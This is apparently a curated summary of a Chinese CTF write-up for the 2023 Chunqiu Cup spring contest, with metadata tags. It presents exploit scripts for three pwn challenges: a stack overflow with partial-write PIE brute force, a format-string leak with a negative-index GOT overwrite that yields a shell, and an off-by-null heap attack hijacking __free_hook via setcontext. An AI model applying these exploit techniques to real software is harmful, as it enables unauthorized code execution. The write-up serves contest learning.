---
title: 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇
contest: 春秋杯2023春季赛
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags: [栈溢出, partial write绕PIE, 格式化字符串泄露elfbase, off-by-null, setcontext+orw, lua字节码]
attack_chain: p2048栈溢出+partial write 4bit爆破→LzhiFTP格式化字符串泄elfbase+idx负数越界写got→lua字节码修复+off-by-null堆overleap+setcontext+orw劫持free_hook
key_payload: "p2048:sl(b'a'*(1048+4)+b'\\x60'+b'\\x5e'+b'\\xff');LzhiFTP:'No%6$p'泄elfbase+idx=-16负数越界;setcontext+orw;lua字节码修复文件头"
one_liner: 春秋杯2023春季赛pwn/web/misc三方向：p2048栈溢出+partial write+FTP fmtstr+got覆写+lua堆
lesson: partial write爆破4bit+fmtstr %p泄elfbase+idx未检查负数是常见pwn套路
quality: high
---

# 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇

**赛事**：春秋杯2023春季赛 pwn/web/misc方向

**关键题目**：

**1. p2048（栈溢出 + partial write 4bit爆破）**
- 保护全开
- 栈数组 v7[1048]，无操作步数上限 → 栈溢出
- win函数调 `system('/bin/sh')` → 劫持流到win
- partial write绕PIE：页偏移一致 → 爆破4bit
- EXP:
  ```python
  sl(b'a'*(1048+4) + b'\x60' + b'\x5e' + b'\xff')
  ```

**2. easy_LzhiFTP（格式化字符串+负数idx越界写got）**
- GOT表可写
- 固定srand种子 → password可预测
- GDB断点 `strcmp(s1, s2)` 查s2 → 获得password
- 登录后简化版shell
- edit流程：idx只检查 `> 10`，未检查 `< 0`
- touch时将创建的文件名写到bss
- yes/No部分：`printf(byte_4968)` 格式化字符串漏洞
- **EXP**：
  ```python
  sla("Username: ", b'hash')
  sla('Input Password: ', b'\x00')
  sla("do you like my Server??(yes/No)", b'No%6$p')  # 泄elfbase
  elfbase = int(ru('\n'), 16) - 0x2096
  puts_got = elfbase + elf.got["puts"]
  system = elfbase + elf.plt["system"]
  payload = b'touch ' + p64(puts_got)
  sla("IMLZH1-FTP> ", payload)
  sla("IMLZH1-FTP> ", 'edit')
  sea(b'idx:\n', '-16')  # 负数idx越界
  se(p64(system))  # 写system到puts_got
  sla("IMLZH1-FTP> ", 'touch /bin/sh')
  sl("ls")
  ```

**3. lua字节码 + 堆off-by-null**
- lua字节码文件头被修改 → 修复文件头正常运行
- add_chunk中花指令混淆，实际存在off-by-null：`size & 0xf = 8, inuse = 0`
- 伪造双向链表，向前合并overleap
- 劫持 `__free_hook` 为 `setcontext+orw` gadget链
- `mov rdx, [rdi+8]; mov [rsp], rax; call [rdx+0x20]` 控制rdx
- 触发ORW读flag

**技术总结**：
- partial write爆破PIE 4bit
- 格式化字符串 `%p` 泄elfbase
- 负数idx越界写got
- off-by-null堆overleap
- setcontext+orw劫持free_hook

**质量评估**：高（命令级exp完整，4题覆盖pwn核心漏洞）
